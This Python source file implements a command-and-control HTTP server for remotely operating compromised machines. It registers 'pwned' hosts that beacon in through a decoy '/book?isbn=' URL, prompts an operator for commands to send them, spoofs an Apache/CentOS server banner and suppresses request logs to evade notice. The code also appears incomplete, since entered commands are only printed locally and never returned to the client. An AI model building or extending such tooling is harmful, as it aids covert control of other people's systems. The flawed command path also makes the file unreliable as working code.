from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = 1337

BIND_ADDR = ""

CMD_REQUEST = "/book?isbn="


class C2Handler(BaseHTTPRequestHandler):
    """ This is a child class of the BaseHTTPRequestHandler class.  It handles all HTTP requests that arrive at the c2
    server."""

    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"

    def do_GET(self):
        global active_session, client_account, client_hostname, pwned_dict, pwned_id

        if self.path.startswith(CMD_REQUEST):
            client = self.path.split(CMD_REQUEST)[1]
            if client not in pwned_dict.values():
                
                self.send_response(200)
                self.end_headers()

                pwned_id += 1
                pwned_dict[pwned_id] = client

                client_account = client.split('@')[0]

                client_hostname = client.split('@')[1]

                print(f"{client_account}@{client_hostname} has been pwned!\n")

            elif client == pwned_dict[active_session]:

                command = input(f"{client_account}@{client_hostname}: ")
                self.send_response(200)
                self.end_headers()
                print(command)
            else:
                self.send_response(404)
                self.end_headers()

    def log_request(self, code="-", size="-"):
        ###
        return


active_session = 1
client_account = ""
client_hostname = ""
pwned_id = 0
pwned_dict = {}

server = HTTPServer((BIND_ADDR, PORT), C2Handler)
server.serve_forever()
